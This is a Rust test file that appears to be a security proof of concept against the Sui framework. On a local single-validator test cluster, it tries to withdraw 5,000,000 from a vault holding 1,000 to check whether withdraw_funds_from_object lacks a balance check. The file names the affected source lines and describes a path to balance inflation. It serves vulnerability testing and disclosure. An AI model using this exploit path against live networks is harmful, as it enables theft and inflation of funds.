// Copyright (c) Mysten Labs, Inc.
// SPDX-License-Identifier: Apache-2.0

//! PoC: Object Withdrawal Balance Check Bypass
//! 
//! This test demonstrates that withdraw_funds_from_object() does NOT check
//! if the requested amount exceeds the actual balance in the object.
//! 
//! VULNERABILITY PATH:
//!   1. Deposit 1000 into vault
//!   2. Request withdrawal of 5,000,000 via object_balance::withdraw_funds
//!   3. If NO balance check: TX succeeds → [CRITICAL]
//!   4. If balance check exists: TX fails → [SAFE]
//!
//! AFFECTED CODE:
//!   - sui-framework/sources/balance.move:113-114
//!   - sui-framework/sources/funds_accumulator.move:89-93
//!   - Move comment: "Does not abort even if the value is greater than the amount in the object"

use std::sync::Arc;
use sui_protocol_config::ProtocolConfig;
use sui_test_transaction_builder::FundSource;
use sui_types::effects::TransactionEffectsAPI;
use test_cluster::addr_balance_test_env::{TestEnv, TestEnvBuilder};

#[tokio::test]
async fn test_object_withdrawal_no_balance_check() {
    println!("\n========================================");
    println!("  PoC: Object Withdrawal Inflation");
    println!("  Target: balance::withdraw_funds_from_object");
    println!("========================================\n");

    // [1] Setup test environment with object withdrawal enabled
    let mut env = TestEnvBuilder::new()
        .with_num_validators(1)
        .with_proto_override_cb(Box::new(|_, mut cfg| {
            cfg.set_enable_object_funds_withdraw_for_testing(true);
            cfg
        }))
        .build()
        .await;

    println!("[+] Test cluster started (1 validator)");
    println!("[+] enable_object_funds_withdraw = TRUE\n");

    // [2] Setup funded vault: publish object_balance package, create vault, deposit 1000
    let (package_id, vault_id) = env.setup_funded_object_balance_vault(1000).await;
    println!("[1] Published object_balance package: {}", package_id);
    println!("[2] Created vault: {}", vault_id);
    println!("[3] Deposited 1000 into vault\n");

    // [3] Get vault object reference
    let vault_ref = env.cluster.get_latest_object_ref(&vault_id).await;
    println!("[+] Vault ObjectRef: {:?}", vault_ref);

    // [4] Get sender and gas
    let sender = env.get_sender(0);
    let gas = env.gas_objects[&sender][0];
    println!("[+] Sender: {}", sender);

    // [5] ATTACK: Try to withdraw 5,000,000 from vault with only 1000
    let attack_amount = 5_000_000u64;
    println!(
        "\n[4] ATTACK: Withdrawing {} from vault with balance 1000...",
        attack_amount
    );

    let tx = env
        .tx_builder_with_gas(sender, gas)
        .transfer_sui_to_address_balance(
            FundSource::object_fund_owned(package_id, vault_ref),
            vec![(attack_amount, sender)],
        )
        .build();

    let result = env.exec_tx_directly(tx).await;

    // [6] Analyze result
    match result {
        Ok((digest, effects)) => {
            println!("[5] TX Digest: {}", digest);
            println!("[5] TX Status: {:?}", effects.status());

            if effects.status().is_ok() {
                println!("\n########################################");
                println!("#  [CRITICAL] VULNERABILITY CONFIRMED!  #");
                println!("########################################");
                println!("#");
                println!("#  withdraw_funds_from_object() BYPASSED");
                println!("#  the balance check!");
                println!("#");
                println!("#  Requested: 5,000,000");
                println!("#  Available: 1,000");
                println!("#  Result:    SUCCESS (no abort)");
                println!("#");
                println!("#  This allows inflation: Split event emitted");
                println!("#  → settlement underflow → task death");
                println!("#  → Split never applied → balance inflated");
                println!("#");
                println!("########################################");

                panic!(
                    "[CRITICAL] Object withdrawal bypasses balance check - \
                     TX succeeded when it should have failed!"
                );
            } else {
                println!("\n[SAFE] Transaction failed as expected");
                println!("       Details: {:?}", effects.status());
                println!("\nA hidden defense blocked the attack.");
            }
        }
        Err(e) => {
            println!("\n[SAFE] Execution error (attack blocked)");
            println!("       Error: {:?}", e);
        }
    }
}
